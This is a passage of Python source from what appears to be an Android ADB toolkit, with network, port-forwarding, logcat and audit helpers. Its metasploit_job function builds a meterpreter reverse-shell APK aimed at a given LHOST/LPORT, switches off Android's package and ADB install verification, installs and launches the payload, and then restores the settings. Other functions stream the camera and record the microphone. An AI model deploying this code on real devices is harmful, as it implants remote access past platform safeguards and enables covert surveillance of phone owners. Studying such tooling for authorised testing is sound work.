    result = shell(serial, "ping", "-c", "4", host, timeout=20)
    return _ok(result.text or "Ping finished.", data={"output": result.text})


def network_snapshot(serial: str) -> dict[str, Any]:
    addr = shell_text(serial, "ip", "addr")
    if not addr.strip():
        addr = shell_text(serial, "ifconfig")
    return _ok(
        "Network.",
        data={
            "addr": addr[:8000],
            "route": shell_text(serial, "ip", "route"),
            "dns": shell_text(serial, "getprop", "net.dns1"),
        },
    )


def port_add(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    local = _port(params.get("local"), "Local port")
    remote = _port(params.get("remote"), "Remote port")
    return _result(run(["forward", f"tcp:{local}", f"tcp:{remote}"], serial=serial), "Forward added.")


def port_reverse(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    device = _port(params.get("device"), "Device port")
    host = _port(params.get("host"), "Host port")
    return _result(run(["reverse", f"tcp:{device}", f"tcp:{host}"], serial=serial), "Reverse added.")


def port_list(serial: str) -> dict[str, Any]:
    result = run(["forward", "--list"], serial=serial)
    return _ok("Rules.", data={"output": result.text})


def port_remove(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    spec = _require(params, "spec")
    if not re.fullmatch(r"tcp:\d{1,5}", spec):
        return _fail("Rule must look like tcp:8080.")
    return _result(run(["forward", "--remove", spec], serial=serial), "Rule removed.")


def port_remove_all(serial: str) -> dict[str, Any]:
    return _result(run(["forward", "--remove-all"], serial=serial), "All rules removed.")


def logcat_snippet(serial: str, params: dict[str, Any]) -> dict[str, Any]:
    lines = str(params.get("lines") or "500")
    if not lines.isdigit() or not 1 <= int(lines) <= 5000:
        return _fail("Lines must be 1-5000.")
    result = run(["logcat", "-d", "-t", lines], serial=serial, timeout=30)
    path = _save_text(f"logcat-{_stamp()}.txt", result.stdout + result.stderr)
    return _ok("Logcat saved.", data={"output": (result.stdout + result.stderr)[-8000:]}, artifact=path)


def hardax_run(config: Any, serial: str, extra: list[str]) -> dict[str, Any]:
    import subprocess

    from modules.tools import hardax_argv, require_hardax
    from modules.vulnerability import (
        _find_audit_json,
        _find_html_report,
        _run_dir,
        _save_latest_pointer,
    )

    if not require_hardax(config):
        return _fail("HARDAX is not installed or is too old.")
    run_base = _run_dir()
    args = [
        "--mode",
        "adb",
        "--serial",
        serial,
        "--out",
        str(run_base),
        "--json-out",
        "--profile",
        "generic",
        *extra,
    ]
    completed = subprocess.run(hardax_argv(config, args), capture_output=True, text=True)
    json_path = _find_audit_json(run_base)
    html_path = _find_html_report(run_base)
    if json_path:
        _save_latest_pointer(run_base, json_path, html_path)
    if completed.returncode != 0 and not json_path:
        return _fail((completed.stderr or completed.stdout or "HARDAX failed.")[-4000:])
    artifact = str(html_path or json_path or run_base)
    return _ok("HARDAX finished.", data={"runDir": str(run_base)}, artifact=artifact)


def hardax_last() -> dict[str, Any]:
    from modules.vulnerability import _load_latest_pointer

    pointer = _load_latest_pointer()
    if not pointer:
        return _fail("No prior HARDAX run.")
    return _ok("Last report.", data=pointer, artifact=pointer.get("html") or pointer.get("json") or None)


def metasploit_job(config: Any, serial: str, params: dict[str, Any]) -> dict[str, Any]:
    """Build (optional), install, and launch the same meterpreter APK the CLI builds.

    The interactive handler session stays available in the PTY as msfconsole.
    """
    import subprocess

    lhost = _require(params, "lhost")
    lport = _port(params.get("lport"), "LPORT")
    if not is_valid_ipv4(lhost):
        return _fail("Invalid LHOST.")
    reuse = _bool_param(params.get("reuse"))
    apk = Path("test.apk")
    if not reuse:
        msfvenom = config.msfvenom_path or "msfvenom"
        built = subprocess.run(
            [msfvenom, "-p", PAYLOAD_NAME, f"LHOST={lhost}", f"LPORT={lport}", "-o", str(apk)],
            capture_output=True,
            text=True,
        )
        if built.returncode != 0 or not apk.is_file():
            return _fail((built.stderr or built.stdout or "msfvenom failed.")[-4000:])
    elif not apk.is_file():
        return _fail("Reuse was requested but test.apk is missing. Build a new payload.")
    shell(serial, "input", "keyevent", "3")
    shell(serial, "settings", "put", "global", "package_verifier_enable", "0")
    shell(serial, "settings", "put", "global", "verifier_verify_adb_installs", "0")
    installed = run(["install", "-r", str(apk)], serial=serial, timeout=180)
    shell(serial, "monkey", "-p", PAYLOAD_PACKAGE, "1")
    shell(serial, "settings", "put", "global", "package_verifier_enable", "1")
    shell(serial, "settings", "put", "global", "verifier_verify_adb_installs", "1")
    if "Success" not in installed.text and installed.returncode != 0:
        return _fail(installed.text or "Install failed.")
    return _ok(
        f"Payload installed and launched. Start msfconsole and listen on {lhost}:{lport}.",
        data={"lhost": lhost, "lport": lport, "package": PAYLOAD_PACKAGE},
    )


def scrcpy_args(config: Any, serial: str, feature: str, params: dict[str, Any]) -> list[str]:
    extra = ["-s", serial]
    if feature == "camera_live":
        facing = str(params.get("facing") or "back")
        if facing not in ("front", "back"):
            raise AdbError("Camera facing must be front or back.")
        orientation = str(params.get("orientation") or "0")
        if orientation not in ("0", "90", "180", "270"):
            raise AdbError("Invalid orientation.")
        extra += [
            "--video-source=camera",
            f"--camera-facing={facing}",
            f"--capture-orientation={orientation}",
            "--no-audio",
            "--no-control",
        ]
    elif feature == "stream_mic":
        extra += ["--no-video", "--audio-source=mic"]
    elif feature == "stream_device_audio":
        extra += ["--no-video"]
    elif feature in ("record_mic", "record_device_audio"):
        name = f"{'mic' if feature == 'record_mic' else 'device'}-audio-{_stamp()}.opus"
        path = downloads_dir() / name
        extra += ["--no-video", "--no-playback", f"--record={path}"]
        if feature == "record_mic":
            extra.append("--audio-source=mic")
    else:
        raise AdbError("Unknown scrcpy session.")
    return scrcpy_argv(config, extra)
